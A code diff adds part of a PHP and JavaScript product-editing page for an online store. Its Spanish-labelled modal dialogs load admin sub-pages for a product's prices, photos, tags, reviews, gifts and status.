+                width: '750px',
+                willClose: () => {
+                    location.href="";
+                }
+            });
+            $("#edit").load("tienda/admin/productos_precios_uno.php?id=<?= $prod_id ?>");
+        }
+        
+        function editaDescripcion() {
+            Swal.fire({
+                title: 'Información básica del producto',
+                html: '<div id="edit"></div>',
+                showCloseButton: true,
+                showCancelButton: false,
+                showConfirmButton: false,
+                width: '750px',
+                willClose: () => {
+                    location.href="";
+                }
+            });
+            $("#edit").load("tienda/frontEditor/producto_descripcion.php?id=<?= $prod_id ?>");
+        }
+        
+        function editaFotos() {
+            Swal.fire({
+                title: 'Archivos del producto',
+                html: '<div id="edit"></div>',
+                showCloseButton: true,
+                showCancelButton: false,
+                showConfirmButton: false,
+                width: '750px',
+                willClose: () => {
+                    location.href="";
+                }
+            });
+            $("#edit").load("tienda/admin/productos_imagenes_uno.php?id=<?= $prod_id ?>");
+        }
+        
+        function editaEspecificaciones() {
+            Swal.fire({
+                title: 'Especificaciones del producto',
+                html: '<div id="edit"></div>',
+                showCloseButton: true,
+                showCancelButton: false,
+                showConfirmButton: false,
+                width: '750px',
+                willClose: () => {
+                    location.href="";
+                }
+            });
+            $("#edit").load("tienda/frontEditor/producto_especificaciones.php?id=<?= $prod_id ?>");
+        }
+        
+        function editaEtiquetas() {
+            Swal.fire({
+                title: 'Etiquetas del producto',
+                html: '<div id="edit"></div>',
+                showCloseButton: true,
+                showCancelButton: false,
+                showConfirmButton: false,
+                width: '80%'
+            });
+            $("#edit").load("tienda/admin/productos_etiquetas_uno.php?id=<?= $prod_id ?>");
+        }
+        
+        function editaOpiniones() {
+            Swal.fire({
+                title: 'Opiniones del producto',
+                html: '<div id="edit"></div>',
+                showCloseButton: true,
+                showCancelButton: false,
+                showConfirmButton: false,
+                width: '750px',
+                willClose: () => {
+                    location.href="";
+                }
+            });
+            $("#edit").load("tienda/admin/productos_comentarios_uno.php?id=<?= $prod_id ?>");
+        }
+        
+        function editaPreguntas() {
+            Swal.fire({
+                title: 'Preguntas del producto',
+                html: '<div id="edit"></div>',
+                showCloseButton: true,
+                showCancelButton: false,
+                showConfirmButton: false,
+                width: '750px',
+                willClose: () => {
+                    location.href="";
+                }
+            });
+            $("#edit").load("tienda/admin/productos_preguntas_uno.php?id=<?= $prod_id ?>");
+        }
+        
+        function editaEstado() {
+            let estado = "<?= $estado ?>";
+            
+            if (estado == "a") {
+                Swal.fire({
+                    title: 'Estado del producto',
+                    html:   '<div class="card">'+
+                                '<a href="#" onclick="inactivar_producto()" class="btn btn-sm btn-danger btn-block">Inactivar</a>'+
+                            '</div>',
+                    showCloseButton: true,
+                    showCancelButton: false,
+                    showConfirmButton: false,
+                    willClose: () => {
+                        location.href="";
+                    }
+                });
+            } else {
+                Swal.fire({
+                    title: 'Estado del producto',
+                    html:   '<div class="card">'+
+                                '<a href="#" onclick="activar_producto()" class="btn btn-sm btn-primary btn-block">Activar</a>'+
+                            '</div>',
+                    showCloseButton: true,
+                    showCancelButton: false,
+                    showConfirmButton: false
+                });
+            }
+        }
+            
+        function editaRegalos() {
+            Swal.fire({
+                title: 'Regalos del producto',
+                html: '<div id="edit"></div>',
+                showCloseButton: true,
+                showCancelButton: false,
+                showConfirmButton: false,
+                width: '750px',
+                willClose: () => {
+                    location.href="";
+                }
+            });
+            $("#edit").load("tienda/admin/productos_regalos_uno.php?id=<?= $prod_id ?>");
+        }
+            
+        function editaRecomendaciones() {
+            Swal.fire({
+                title: 'Recomendaciones del producto',
+                html: '<div id="edit"></div>',
+                showCloseButton: true,
+                showCancelButton: false,
+                showConfirmButton: false,
+                width: '1350px',
+                willClose: () => {
+                    location.href="";
+                }
+            });
+            $("#edit").load("../tienda/admin/recomendaciones_uno.php?id=<?= $prod_id ?>");
+        }
+            
+        function activar_producto() {
+            $.post("controladores/productos.php?accion=activar", { prod_id: <?= $prod_id ?> }, function (e) {
+                location.href="";
+            });
+        }
+            
+        function inactivar_producto() {
+            $.post("controladores/productos.php?accion=desactivar", { prod_id: <?= $prod_id ?> }, function (e) {
+                location.href="";
+            });
+        }
+            
+    <?php } ?>
+        
+    <?php
+        if ($_REQUEST['opiniones'] == 1) {
+            echo 'setTimeout(function() {
+                document.getElementById("opinionesBtn").click();
+            }, 1200);';
+        }
+    ?>
+
+    init();    
+</script>
+<?php require 'footer.php'; ?>
